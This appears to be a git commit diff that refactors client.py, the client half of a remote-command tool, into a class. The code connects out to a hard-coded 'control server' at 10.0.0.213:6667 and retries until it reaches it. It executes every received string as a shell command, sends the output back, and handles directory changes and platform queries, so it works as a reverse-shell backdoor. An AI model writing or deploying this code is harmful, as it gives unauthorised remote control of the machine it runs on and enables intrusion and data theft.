29841da0ad11cb58adfc8c39671b99ad2241fa2d
Wykleph <sanctuary@Parkers-MacBook-Pro.local>
2016-08-25 09:28:41 -0700

    Turned client into a class for reusability. Also started using termination strings to denote when data is finished sending.

--- client.py
+++ client.py
@@ -6,115 +6,124 @@ from os.path import expanduser
 from time import sleep
 
 
-the_host = '10.0.0.213'
-the_port = 6667
+class Client(object):
+    def __init__(self, host='', port=6667):
+        self.host = host
+        self.port = port
+        self.connected = False
+        self.sock = self._connect_to_server()
 
+    def _connect_to_server(self):
+        """
+        Ping the control server until it accepts the connection.
 
-def connect_to_server():
-    """
-    Continuously check to see if the control server is online. If it is, connect to it.
+        :return:
+        """
 
-    :return:
-    """
+        self.sock = False
+        self.connected = False
 
-    global the_host
-    global the_port
-    the_sock = False
-
-    # Loop until the connection is successful.
-    while True:
-        the_sock = socket.socket()
-        try:
-            the_sock.connect((the_host, the_port))
-            print('Connected to server...')
-            break
-        except socket.error as the_error_message:
-            print('Waiting for control server {}:{} {}'.format(the_host, the_port, the_error_message))
-            sleep(5)
-
-    return the_sock
-
-
-def send_output_with_cwd(some_str):
-    """
-    Send something back to the control server with the current
-    working directory appended to the end of it.
-
-    :param some_str:
-    :return:
-    """
-
-    global sock
-
-    sock.send(str.encode(some_str + str(os.getcwd()) + '>'))
-
-
-# Make the connection to the control server.
-sock = connect_to_server()
-
-# If we have a socket, then proceed to receive commands.
-if sock:
-    while True:
-        try:
-            data = sock.recv(1024)
-        except socket.error as error_message:
-            print('Server closed connection:', error_message)
-            sock.close()
-            sock = connect_to_server()
-            continue
-
-        # Continue looping if there is no data.
-        if len(data) < 1:
-            continue
-
-        if data.decode('utf-8')[:15] == 'single_command-':
-            d = data.decode('utf-8')[15:]
-            if d == 'get_platform':
-                sock.send(str.encode(sys.platform))
-                continue
-            elif d == 'getcwd':
-                send_output_with_cwd('')
-                continue
-
-        if data.decode('utf-8') == 'quit':
-            # The control server is shutting down, so we should shutdown
-            # then start trying to reconnect for the next session.
-            sock.close()
-            print('Control server disconnected...')
-            print('Waiting for server...')
-            sock = connect_to_server()
-            continue
-
-        # Handle the cd command.
-        if data[:2].decode('utf-8') == 'cd':
+        # Loop until the connection is successful.
+        while True:
+            self.sock = socket.socket()
             try:
-                _dir = data[3:].decode('utf-8')
-                pf = sys.platform
-                # Cross platform cd to ~/
-                if _dir[:2] == '~/':
-                    # Get the full path.
-                    _dir = expanduser('~') + '/' + _dir[2:] if pf != 'win32' else expanduser('~') + '\\' + _dir[2:]
-                # Change the directory
-                os.chdir(_dir)
-                send_output_with_cwd('')
-                continue
-            except Exception as err_msg:
-                err_msg = str(err_msg)
-                send_output_with_cwd(err_msg + "\n")
-                continue
+                self.sock.connect((self.host, self.port))
+                self.connected = True
+                print('Connected to server...')
+                break
+            except socket.error as the_error_message:
+                print('Waiting for control server {}:{} {}'.format(self.host, self.port, the_error_message))
+                sleep(5)
 
-        # Process the command.
-        cmd = subprocess.Popen(
-            data[:].decode('utf-8'),
-            shell=True,
-            stdout=subprocess.PIPE,
-            stderr=subprocess.PIPE,
-            stdin=subprocess.PIPE
-        )
+        return self.sock
 
-        # Compile the output.
-        output_bytes = cmd.stdout.read() + cmd.stderr.read()
-        output_str = str(output_bytes, 'utf-8')
+    def _send_output_with_cwd(self, some_data):
+        """
+        Send something back to the control server with the current
+        working directory appended to the end of it.
 
-        # Send the output back to control server.
-        send_output_with_cwd(output_str)
+        :param some_data:
+        :return:
+        """
+
+        self.sock.send(str.encode(some_data + str(os.getcwd()) + '>' + '~!_TERM_%~'))
+        return self
+
+    def main(self):
+        # If we have a socket, then proceed to receive commands.
+        if self.sock:
+            while True:
+                try:
+                    data = self.sock.recv(1024)
+                except socket.error as error_message:
+                    print('Server closed connection:', error_message)
+                    self.sock.close()
+                    self.sock = self._connect_to_server()
+                    continue
+
+                # Continue looping if there is no data.
+                if len(data) < 1:
+                    continue
+
+                if data.decode('utf-8')[:15] == 'single_command-':
+                    d = data.decode('utf-8')[15:]
+                    if d == 'get_platform':
+                        self.sock.send(str.encode(sys.platform + '~!_TERM_%~'))
+                        continue
+                    elif d == 'getcwd':
+                        self._send_output_with_cwd('')
+                        continue
+
+                if data.decode('utf-8') == 'quit':
+                    # The control server is shutting down, so we should shutdown
+                    # then start trying to reconnect for the next session.
+                    self.sock.close()
+                    print('Control server disconnected...')
+                    print('Waiting for server...')
+                    self.sock = self._connect_to_server()
+                    continue
+
+                # Handle the cd command.
+                if data[:2].decode('utf-8') == 'cd':
+                    try:
+                        _dir = data[3:].decode('utf-8')
+
+                        # Cross platform cd to ~/
+                        if _dir[:2] == '~/':
+                            # shorten variable name and function name for the next 1 liner.
+                            p, expusr = sys.platform, expanduser
+                            # Get the full path.
+                            _dir = expusr('~') + '/' + _dir[2:] if p != 'win32' else expanduser('~') + '\\' + _dir[2:]
+                            p, expurs = None, None
+                            del p
+                            del expurs
+
+                        # Change the directory
+                        os.chdir(_dir)
+                        self._send_output_with_cwd('')
+                        continue
+                    except Exception as err_msg:
+                        err_msg = str(err_msg)
+                        self._send_output_with_cwd(err_msg + "\n")
+                        continue
+
+                # Process the command.
+                cmd = subprocess.Popen(
+                    data[:].decode('utf-8'),
+                    shell=True,
+                    stdout=subprocess.PIPE,
+                    stderr=subprocess.PIPE,
+                    stdin=subprocess.PIPE
+                )
+
+                # Compile the output.
+                output_bytes = cmd.stdout.read() + cmd.stderr.read()
+                output_str = str(output_bytes, 'utf-8')
+
+                # Send the output back to control server.
+                self._send_output_with_cwd(output_str)
+
+
+if __name__ == '__main__':
+    c = Client(host='10.0.0.213', port=6667)
+    c.main()
